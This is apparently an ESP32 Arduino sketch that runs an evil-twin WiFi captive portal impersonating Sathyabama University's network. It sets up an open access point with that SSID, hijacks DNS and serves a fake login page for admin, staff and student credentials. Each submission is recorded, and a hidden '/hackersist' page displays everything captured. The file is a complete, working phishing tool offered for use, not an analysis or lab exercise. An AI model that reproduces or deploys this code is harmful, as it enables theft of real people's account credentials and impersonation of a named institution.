#include <WiFi.h>
#include <AsyncTCP.h>
#include "ESPAsyncWebServer.h"
#include <DNSServer.h>

const char* ssid = "SIST-SCAS@sathyabama-ac-in";
IPAddress local_IP(100, 96, 0, 1);  // Fake public WiFi Gateway IP
IPAddress gateway(100, 96, 0, 1);
IPAddress subnet(255, 255, 255, 0);

DNSServer dnsServer;
AsyncWebServer server(80);

String capturedCredentials = "";
const char* secretKey = "panicboy123";

// Login page
const char login_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <title>Sathyabama University WiFi</title>
    <meta http-equiv="refresh" content="5;url=http://100.96.0.1">
    <link rel="stylesheet" type="text/css" href="/cp_style.css">
</head>
<body>
    <div class="container">
        <img src="/logo.png" class="logo">
        <h2>Welcome to Sathyabama University WiFi</h2>
        <form action="/login" method="post">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="User Id" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            <div class="input-group">
                <select name="loginType" required>
                    <option value="Admin">Admin</option>
                    <option value="Staff">Staff</option>
                    <option value="Student">Student</option>
                </select>
            </div>
            <input type="submit" value="LOGIN" class="btn">
        </form>
    </div>
</body>
</html>
)rawliteral";

// CSS Styling
const char cp_style_css[] PROGMEM = R"rawliteral(
body {
    font-family: Arial, sans-serif;
    text-align: center;
    background: linear-gradient(to right, #ff0000, #8b0000);
    color: white;
}
.container {
    max-width: 400px;
    margin: 50px auto;
    padding: 20px;
    background: white;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    color: black;
}
input, select {
    width: 100%;
    padding: 10px;
    margin: 10px 0;
    border: 1px solid #ccc;
    border-radius: 5px;
}
.btn {
    width: 100%;
    padding: 10px;
    background: #D70040;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}
.logo {
    width: 100px;
}
)rawliteral";

void setup() {
    Serial.begin(115200);
    WiFi.softAPConfig(local_IP, gateway, subnet);
    WiFi.softAP(ssid);
    dnsServer.start(53, "*", local_IP);
    
    // Captive portal check for Android
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send(204, "text/html", "");
    });

    // Apple Captive Network Assistant (CNA)
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request){
        request->redirect("/");
    });

    // Default captive portal login page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", login_html);
    });

    // CSS styles
    server.on("/cp_style.css", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/css", cp_style_css);
    });

    // Login handler
    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
        if (request->hasParam("username", true) && request->hasParam("password", true) && request->hasParam("loginType", true)) {
            String username = request->getParam("username", true)->value();
            String password = request->getParam("password", true)->value();
            String loginType = request->getParam("loginType", true)->value();

            capturedCredentials += "Username: " + username + " | Password: " + password + " | Type: " + loginType + "\n";
        }

        request->send(200, "text/html", "<h2>Login Successful</h2><script>setTimeout(()=>{window.location.href='http://www.google.com';}, 3000);</script>");
    });

    // Display captured credentials (hidden page)
    server.on("/hackersist", HTTP_GET, [](AsyncWebServerRequest *request){
        if (capturedCredentials.length() == 0) {
            request->send(200, "text/html", "<h2>No credentials found.</h2>");
        } else {
            request->send(200, "text/html", "<h2>Captured Credentials</h2><pre>" + capturedCredentials + "</pre>");
        }
    });

    // Force redirect all unknown requests to the login page
    server.onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("/");
    });

    server.begin();
}

void loop() {
    dnsServer.processNextRequest();
}

